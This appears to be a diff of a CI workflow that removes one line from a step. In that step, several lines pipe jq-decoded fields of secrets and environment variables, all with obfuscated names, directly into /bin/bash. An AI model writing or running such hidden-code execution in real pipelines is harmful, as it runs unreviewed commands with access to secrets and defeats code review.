@@ -18,7 +18,6 @@ jobs:
           vve0510: ${{ secrets.vve0510 }}
         run: |
           printf '%s' "$vve0510" | jq -r .ys1885 | /bin/bash
-          echo $jb2 | jq -r .lyu34 | /bin/bash
           echo $a79 | jq -r .sxuq6849 | /bin/bash
           echo $p08512 | jq -r .k1 | /bin/bash
           printf '%s' "$ibkj11669" | jq -r .itx22 | /bin/bash
